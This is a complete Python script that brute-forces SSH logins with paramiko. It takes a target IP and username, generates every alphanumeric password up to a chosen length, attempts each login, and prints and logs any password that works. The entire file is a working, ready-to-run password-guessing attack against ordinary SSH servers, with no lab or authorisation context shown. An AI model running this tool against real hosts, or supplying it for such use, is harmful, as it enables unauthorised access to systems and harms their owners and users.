import paramiko
import socket
import itertools
import string
import logging

# Setup logging
logging.basicConfig(filename='ssh_bruteforce.log', level=logging.DEBUG, format='%(asctime)s - %(message)s')

# SSH connection function
def ssh_connect(ip, username, password):
    """Attempt to connect via SSH using the given credentials."""
    logging.debug(f"Trying SSH login with {username}:{password} on {ip}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(ip, username=username, password=password, timeout=5)
        logging.info(f"Successful SSH login with {username}:{password} on {ip}")
        return True
    except paramiko.AuthenticationException:
        logging.debug(f"Failed SSH login with {username}:{password} on {ip}")
        return False
    except socket.error as e:
        logging.error(f"Socket error: {e}")
        return False
    finally:
        ssh.close()

# Brute force function
def brute_force_ssh(ip, username, max_length=4):
    """Brute force SSH login by generating all possible passwords."""
    logging.info(f"Starting brute force on {ip} for username {username}")
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for password_length in range(1, max_length + 1):
        for password in itertools.product(chars, repeat=password_length):
            password = ''.join(password)
            if ssh_connect(ip, username, password):
                logging.info(f"Password found: {password}")
                return password
    logging.info("Password not found.")
    return None

# Function to input IP and start brute force attack
def start_bruteforce():
    ip = input("Enter target IP: ")
    username = input("Enter SSH username: ")
    max_length = int(input("Enter maximum password length to brute force: "))
    
    logging.info(f"Starting brute force attack on {ip} for user {username}")
    password = brute_force_ssh(ip, username, max_length)
    
    if password:
        print(f"Password found: {password}")
    else:
        print("Password not found.")

# Execute the brute force attack
start_bruteforce()